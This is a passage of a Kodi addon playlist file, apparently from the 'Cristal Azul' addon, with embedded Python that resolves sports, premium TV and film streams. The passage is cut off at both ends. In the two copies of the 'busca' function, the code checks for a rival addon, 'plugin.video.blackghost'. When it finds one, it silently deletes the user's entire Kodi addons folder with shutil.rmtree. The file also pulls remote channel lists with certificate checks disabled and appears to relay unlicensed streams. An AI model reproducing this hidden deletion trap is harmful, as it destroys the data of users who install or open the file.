<regex>
<name>plugin</name>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if 'f4m=' in url:
    return 'plugin://plugin.video.f4mTester'
  else:
    return ''
]]></expres>
<page></page>
</regex>
<regex>
<name>multi</name>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
title = '[makelist2.param1]'
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import re,json
def GetLSProData(page_data,Cookie_Jar,m,url=url,title=title):

    if '{' in url[:5]:
        items = json.loads('['+url+']')
        dialog = xbmcgui.Dialog()
        seleccion = []
        enlaces = []
        for item in items:
            seleccion.append(item['titulo'])
            enlaces.append(item['url'])
        titulo = dialog.select('seleciona enlace: '+title, seleccion)
        if (titulo < 0):
            dialog = xbmcgui.Dialog()
            dialog.notification("Cristal Azul", "Reproduccion cancelada!!!",
                            xbmcgui.NOTIFICATION_INFO, 5000, False)
            return
        return enlaces[titulo]
    else:
      if '104 116 116 112 115'==url[:17]:
          return desencriptar()
      elif '106 98 98 114 114'==url[:17]:
        return 'https' + desencriptar()[5:]
      else:
        return url
def desencriptar():
  s = url
  def enc(s):
    d=''
    s=s.split(' ')
    for strchar in s:
        d += chr(int(strchar)-0)
    return d
  return enc(s)
]]></expres>
<page></page>
</regex>
<regex>
<name>depen</name>
<expres><![CDATA[#$pyFunction
finalurl = '$doregex[multi]'
titulo = '[makelist2.param1]'
foto = '[makelist2.param2]'
import re,requests,resolveurl,base64,shutil
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves.urllib_parse import urlencode
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m,finalurl=finalurl,titulo=titulo,foto=foto):#cLrJIhsDApL

  if 'f4m=' in finalurl:
    url = finalurl[4:]
    return '/?' + url
  elif 'DiRecto=' in finalurl:
     return finalurl[8:]
  elif 'm3u8' in finalurl:
     return finalurl
  elif 'shidurlive' in finalurl:
    try:
     html = requests.get(finalurl).text
     html = six.ensure_str(html)
     if 'OFFLINE'==re.findall('badge badge.*?>(.*?)<',html)[0]:
       return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]Enlace No Activado todavia...[/COLOR], 6000)")
     else:
       return re.findall('Clappr.Player[\w\W]*?(?:source|src):\s*[\'"]([^\'"]+)',html)[0]
    except:
       return re.findall('Clappr.Player[\w\W]*?(?:source|src):\s*[\'"]([^\'"]+)',html)[0]
  elif 'smashcast' in finalurl:
     link = finalurl.replace('https://www.smashcast.tv/','')
     urllink = 'https://www.smashcast.tv/api/player/config/live/' + link + '?redis=true&ssl=true&autoplay=true&embed=false&no_interruption=false&qos=false&showHidden=true&ssl=true&subscribed=false'
     extraer = urllib_request.urlopen(urllink).read()
     extraer = six.ensure_str(extraer)
     return re.findall('"url":"(.*?)"', extraer)[0].replace('\/','/')
  elif '//vk.' in finalurl:
     agente = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0', 'Referer': 'https://vk.com/'}
     extraer = requests.get(finalurl, headers=agente)
     extraer = six.ensure_str(extraer)
     AgenteCristal = re.findall('hls":"(.*?)"', extraer.text)[0]
     return AgenteCristal.replace('\/','/')
  elif 'mp4' in finalurl:
     return finalurl
  elif ':0:0' in finalurl:
     return finalurl
  elif 'mp3' in finalurl:
     return finalurl
  elif 'no_enlace' in finalurl:
     return xbmc.executebuiltin('Notification([COLOR white]Lo sentimos ![/COLOR],[COLOR gold]esto no es un enlace[/COLOR], 5000)')
  elif not 'http' in finalurl:
     xbmc.executebuiltin('Notification([COLOR white]Intentando Reproducir[COLOR gold] Acestream[/COLOR],[COLOR gold]Necesario Horus y Acestream[/COLOR], 5000)')
     lanzar_horus = 'plugin://script.module.horus/?{}'.format(urlencode({'id': finalurl, 'action': 'play', 'title': titulo, 'iconimagen': foto}))
     return lanzar_horus
  else:
   try:
       u = resolveurl.resolve(finalurl)
   except:
       u = finalurl
   return u
]]></expres>
<page></page>
</regex>
<regex>
<name>vk</name>
<expres>hls":"(.*?)"</expres>
<page>[makelist2.param3]</page>
<referer>https://vk.com/</referer>
 <agent>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0</agent>  
 <cookiejar></cookiejar>
</regex>
<thumbnail>https://i.imgur.com/VqyKLMp.jpg</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
</item>








<item>
<title>[COLOR lightskyblue]Estable [COLOR orangered]Chikiry_Cristal TV HD[/COLOR]</title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[A.param1]</title>
<thumbnail>[A.param3]</thumbnail>
<fanart>https://i.imgur.com/yNfc6m7.jpg</fanart>
<link>$doregex[busca]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data, Cookie_Jar, m):
    items = [('[COLOR gold]** [/COLOR][COLOR white]INFORMACION IMPORTANTE[COLOR gold] **[/COLOR]', 'informacion', 'https://i.imgur.com/Z2uD47a.jpg'), ('[COLOR orangered]+ [COLOR white]CANALES DE DEPORTES[/COLOR]', 'deportes', 'https://i.imgur.com/ZcG5Wvu.jpg'), ('[COLOR orangered]+ [COLOR white]TV PREMIUM[/COLOR]', 'tvpremium', 'https://i.imgur.com/AhCogTD.jpg'), ('[COLOR orangered]+ [COLOR white]TDT[/COLOR]', 'tdt', 'https://i.imgur.com/Zu3ZtDQ.jpg'), ('[COLOR orangered]+ [COLOR white]TV INFANTIL[/COLOR]', 'infantil', 'https://i.imgur.com/7iGElA4.jpg'), ('[COLOR orangered]+ [COLOR white]CANALES DE DOCUMENTALES[/COLOR]', 'documentales', 'https://i.imgur.com/hzBiiWJ.jpg'), ('[COLOR orangered]+ [COLOR white]TAQUILLAS[/COLOR]', 'taquilla', 'https://i.imgur.com/gfpSeHc.jpg'), ('[COLOR orangered]+ [COLOR white]LATINOS[/COLOR]', 'latino', 'https://i.imgur.com/8nIpSn3.jpg')]
    return items
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>busca</name>
<listrepeat><![CDATA[
<title>[COLOR white][busca.param1][/COLOR]</title>
<link>$doregex[plugin]$doregex[link_inteligente]</link>
<thumbnail>[busca.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,shutil
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data, Cookie_Jar, m,elegir=elegir):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    past = urllib_request.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/TV/cristal_chikiry_distancia').read()
    past = six.ensure_str(past)
    if 'p' == past[:2:][1:]:
      past = 'https://pastebin.com/raw/' + past[:1] + past[2:]
    elif 'b' == past[:2:][1:]:
      past = 'http://bit.ly/' + past[:1] + past[2:]
    else:
      past = 'https://pastebin.com/raw/' + past
    if 'informacion' == elegir:

      dialog = xbmcgui.Dialog()
	  
      dialog.textviewer('CHIKIRY_CRISTAL TV', '[COLOR gold]El addon es completamente gratuito, no se aceptan donaciones.[/COLOR]\n[COLOR white]Si has pagado por el te han estafado.[/COLOR]\n[COLOR white]Las secciones se actualizan a diario, si un canal no funciona, reportarlo en los grupos [/COLOR]\n[COLOR aqua]https://t.me/consultaschikiry    https://t.me/addonfestaycristal[/COLOR]\n[COLOR white]No exijas, no te enfades, no critiques, recuerda que esto es un hobby que compartimos en nuestro tiempo libre, no un servicio de pago[/COLOR]\n[COLOR aqua]Gracias, y disfruta[/COLOR]')

      return [('El addon es completamente gratuito, no se aceptan donaciones.', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')]
		  
    elif 'deportes' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text

      html = six.ensure_str(html)
	  
      data = re.findall('(?s)"DEPORTES".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Deportes', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR none]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]	  

    elif 'tvpremium' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"TVPREMIUM".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]TvPremium', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR none]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
		  

    elif 'tdt' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text

      html = six.ensure_str(html)
	  
      data = re.findall('(?s)"TDT".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Tdt', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
		  

    elif 'infantil' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text

      html = six.ensure_str(html)
	  
      data = re.findall('(?s)"INFANTIL".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Infantil', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
		  

    elif 'documentales' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"DOCUMENTALES".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Documentales', 'https://i.imgur.com/Z2uD47a.jpg', '', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', 'No Hay mas Resultados...', '[COLOR white]resultados...')]
	  
    elif 'taquilla' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"TAQUILLA".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Taquilla', 'https://i.imgur.com/bg6n3AV.png', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/QBdkMFK.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]

    elif 'latino' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"LATINO".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Latinos', 'https://i.imgur.com/bg6n3AV.png', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/QBdkMFK.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
    else:
      xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
      return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>emitiendo</name>
<expres><![CDATA[(?s)[makelist2.param4].*?ahora">\s*(.*?)<]]></expres>
<page>http://www.formulatv.com/programacion/movistarplus/</page>
</regex>
<regex>
<name>prueba_proxi</name>
<expres><![CDATA[#$pyFunction
url = '[busca.param3]'
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Referer': 'https://www.blogdepelis.tv/'}
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
$doregex[reparar_proxies]
]]></expres>
<page></page>
<cookiejar></cookiejar>
</regex>
<regex>
<name>reparar_proxies</name>
<expres><![CDATA[#$pyFunction
import requests,six
def GetLSProData(page_data,Cookie_Jar,m):
    #oficial https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/proxieshttps://pastebin.com/raw/GDkjkYh6
    pasta = requests.get('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/proxies', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>link_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[prueba_proxi]'
titulo = '[busca.param1]'
foto = '[busca.param2]'
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves.urllib_parse import urlencode
import six,re,requests
from resolveurl.plugins.lib import jsunpack
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,titulo=titulo,foto=foto):#cLrJIhsDApL
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    if 'adictosalatele' in url:
      path = TRANSLATEPATH("special://home/addons/plugin.video.cristalazul/html.txt")
      f = open(path, 'r')
      html = f.read()
      f.close()
      iframe = re.findall('(?s)iframe.*?src=[\'"]([^\'"]+)', html)[0]
      html1 = requests.get(iframe, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': url}, verify=False).text
      html1 = six.ensure_str(html1)
      try:
          url2 = re.findall('source.*?[\'"](.*?m3u8.*?)[\'"]', html1)[0]
      except:
          pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', html1)[0]
          unpack=jsunpack.unpack(pack)
          ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
          open(ArchivoDestino + 'adictos_wigi.txt','wb').write(six.ensure_binary(unpack))
          url2 = re.findall('[\'"](https://.*?m3u8.*?)[\'"]', unpack)[0] + '|Referer=' + url
      return url2
    elif 'f4m=' in url:
      url = url[4:]
      return '/?streamtype=HLSRETRY&url='+url
    elif 'acestream=' in url:
      Acestream = url[10:]
      lanzar_horus = 'plugin://script.module.horus/?{}'.format(urlencode({'id': Acestream, 'action': 'play', 'title': titulo, 'iconimagen': foto}))
      return lanzar_horus
    else:
      return url
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>plugin</name>
<expres><![CDATA[#$pyFunction
url = '[busca.param3]'
import re,requests,xbmc
from six.moves.urllib_parse import urlencode
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if 'f4m=' in url:
    return 'plugin://plugin.video.f4mTester'
  else:
    return ''
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/Z2uD47a.jpg</thumbnail>  
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
 </item>


	



<item>
<title>TEST hls|f4m cristal</title>
<link>plugin://plugin.video.cristalazul_3.0/?mode=10&amp;streamtype=HLS&amp;url=https://cdn7.lqsa.es:443/hls/2/stream.m3u8</link>
<thumbnail>https://i.imgur.com/yGTsSPk.jpg</thumbnail>
<fanart>https://i.imgur.com/bg6n3AV.png</fanart>
</item>











<item>
<title>TEST 6|winner f4m</title>
<link>plugin://plugin.video.f4mTester/?streamtype=HLSRETRY&amp;url=http://77.83.117.60:8888/02_BTSPORTHD_1_720p/chunklist.m3u8</link>
<thumbnail>https://i.imgur.com/yGTsSPk.jpg</thumbnail>
<fanart>https://i.imgur.com/bg6n3AV.png</fanart>
</item>



<item>
<title>TEST 6|f4m cristal</title>
<link>plugin://plugin.video.cristalazul_3.0/?mode=10&amp;streamtype=HLSRETRY&amp;url=http://77.83.117.60:8888/02_SPORTTV_3_720p/chunklist.m3u8</link>
<thumbnail>https://i.imgur.com/yGTsSPk.jpg</thumbnail>
<fanart>https://i.imgur.com/bg6n3AV.png</fanart>
</item>








<item>
<title>TEST 5|f4m</title>
<link>plugin://plugin.video.f4mTester/?streamtype=HLSRETRY&amp;url=https://cdn7.lqsa.es:443/hls/2/stream.m3u8</link>
<thumbnail>https://i.imgur.com/yGTsSPk.jpg</thumbnail>
<fanart>https://i.imgur.com/bg6n3AV.png</fanart>
</item>



<item>
<title>TEST 5|f4m cristal</title>
<link>plugin://plugin.video.cristalazul_3.0/?mode=10&amp;streamtype=HLSRETRY&amp;url=https://cdn7.lqsa.es:443/hls/2/stream.m3u8</link>
<thumbnail>https://i.imgur.com/yGTsSPk.jpg</thumbnail>
<fanart>https://i.imgur.com/bg6n3AV.png</fanart>
</item>











<item>
<title>a6 [COLOR lightskyblue]Estable [COLOR orangered]Chikiry_Cristal TV HD[/COLOR]</title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[A.param1]</title>
<thumbnail>[A.param3]</thumbnail>
<fanart>https://i.imgur.com/yNfc6m7.jpg</fanart>
<link>$doregex[busca]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data, Cookie_Jar, m):
    items = [('[COLOR gold]** [/COLOR][COLOR white]INFORMACION IMPORTANTE[COLOR gold] **[/COLOR]', 'informacion', 'https://i.imgur.com/Z2uD47a.jpg'), ('[COLOR orangered]+ [COLOR white]CANALES DE DEPORTES[/COLOR]', 'deportes', 'https://i.imgur.com/ZcG5Wvu.jpg'), ('[COLOR orangered]+ [COLOR white]TV PREMIUM[/COLOR]', 'tvpremium', 'https://i.imgur.com/AhCogTD.jpg'), ('[COLOR orangered]+ [COLOR white]TDT[/COLOR]', 'tdt', 'https://i.imgur.com/Zu3ZtDQ.jpg'), ('[COLOR orangered]+ [COLOR white]TV INFANTIL[/COLOR]', 'infantil', 'https://i.imgur.com/7iGElA4.jpg'), ('[COLOR orangered]+ [COLOR white]CANALES DE DOCUMENTALES[/COLOR]', 'documentales', 'https://i.imgur.com/hzBiiWJ.jpg'), ('[COLOR orangered]+ [COLOR white]TAQUILLAS[/COLOR]', 'taquilla', 'https://i.imgur.com/gfpSeHc.jpg'), ('[COLOR orangered]+ [COLOR white]LATINOS[/COLOR]', 'latino', 'https://i.imgur.com/8nIpSn3.jpg')]
    return items
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>busca</name>
<listrepeat><![CDATA[
<title>[COLOR white][busca.param1][/COLOR]</title>
<link>$doregex[plugin]$doregex[link_inteligente]</link>
<thumbnail>[busca.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,shutil
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data, Cookie_Jar, m,elegir=elegir):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    past = urllib_request.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/TV/cristal_chikiry_distancia').read()
    past = six.ensure_str(past)
    if 'p' == past[:2:][1:]:
      past = 'https://pastebin.com/raw/' + past[:1] + past[2:]
    elif 'b' == past[:2:][1:]:
      past = 'http://bit.ly/' + past[:1] + past[2:]
    else:
      past = 'https://pastebin.com/raw/' + past
    if 'informacion' == elegir:

      dialog = xbmcgui.Dialog()
	  
      dialog.textviewer('CHIKIRY_CRISTAL TV', '[COLOR gold]El addon es completamente gratuito, no se aceptan donaciones.[/COLOR]\n[COLOR white]Si has pagado por el te han estafado.[/COLOR]\n[COLOR white]Las secciones se actualizan a diario, si un canal no funciona, reportarlo en los grupos [/COLOR]\n[COLOR aqua]https://t.me/consultaschikiry    https://t.me/addonfestaycristal[/COLOR]\n[COLOR white]No exijas, no te enfades, no critiques, recuerda que esto es un hobby que compartimos en nuestro tiempo libre, no un servicio de pago[/COLOR]\n[COLOR aqua]Gracias, y disfruta[/COLOR]')

      return [('El addon es completamente gratuito, no se aceptan donaciones.', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')]
		  
    elif 'deportes' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text

      html = six.ensure_str(html)
	  
      data = re.findall('(?s)"DEPORTES".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Deportes', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR none]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]	  

    elif 'tvpremium' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"TVPREMIUM".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]TvPremium', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR none]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
		  

    elif 'tdt' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text

      html = six.ensure_str(html)
	  
      data = re.findall('(?s)"TDT".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Tdt', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
		  

    elif 'infantil' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text

      html = six.ensure_str(html)
	  
      data = re.findall('(?s)"INFANTIL".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Infantil', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
		  

    elif 'documentales' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"DOCUMENTALES".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Documentales', 'https://i.imgur.com/Z2uD47a.jpg', '', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/Z2uD47a.jpg', 'No Hay mas Resultados...', '[COLOR white]resultados...')]
	  
    elif 'taquilla' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"TAQUILLA".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Taquilla', 'https://i.imgur.com/bg6n3AV.png', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/QBdkMFK.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]

    elif 'latino' == elegir:
	
      html = requests.get(past, headers={'User-Agent': 'Mozilla/5.0', 'Referer': 'http://pastebin.com'}, verify=False).text
	  
      html = six.ensure_str(html)

      data = re.findall('(?s)"LATINO".*?"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)".*?"embed": "(.*?)\'', html)

      return [('[COLOR aqua]Chikiry Cristal Resultados de: [COLOR white]Latinos', 'https://i.imgur.com/bg6n3AV.png', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white]', ' ')] + data + [('[COLOR none]No Hay mas Resultados...', 'https://i.imgur.com/QBdkMFK.jpg', '[COLOR white]No hay mÃƒÂ¡s', '[COLOR white]resultados...')]
    else:
      xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
      return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>emitiendo</name>
<expres><![CDATA[(?s)[makelist2.param4].*?ahora">\s*(.*?)<]]></expres>
<page>http://www.formulatv.com/programacion/movistarplus/</page>
</regex>
<regex>
<name>prueba_proxi</name>
